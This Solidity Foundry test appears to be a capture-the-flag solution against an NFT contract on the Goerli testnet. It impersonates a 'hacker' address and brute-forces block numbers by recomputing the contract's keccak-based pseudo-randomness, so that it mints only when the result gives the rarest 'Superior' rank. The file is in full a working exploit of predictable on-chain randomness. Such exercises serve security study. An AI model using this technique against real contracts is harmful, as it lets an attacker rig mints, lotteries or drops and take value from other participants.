// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

/*
Decompiled NFT contract: https://library.dedaub.com/decompile?md5=08445d73b58bbc8bdee1ca105f003634
*/

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);

	function setUp() public {
        vm.createSelectFork("goerli");
		vm.deal(hacker, 1 ether);
		nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
	}

	function test() public {
		vm.startPrank(hacker);
		uint mintedId;
		uint currentBlockNum = block.number;
        (, bytes memory returnData) = nft.call(abi.encodeWithSignature("id()"));
        uint256 previousNftId = uint256(bytes32(returnData));

		// Mint a Superior one, and do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);
			if(uint256(keccak256(abi.encode(previousNftId + 1, address(hacker), block.number)))% 100 >= 90){
                (, bytes memory returnedID) = nft.call{value: 1 ether}(abi.encodeWithSignature("mint()"));
                mintedId = uint256(bytes32(returnedID));
                break;
            }

			currentBlockNum++;
		}
		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}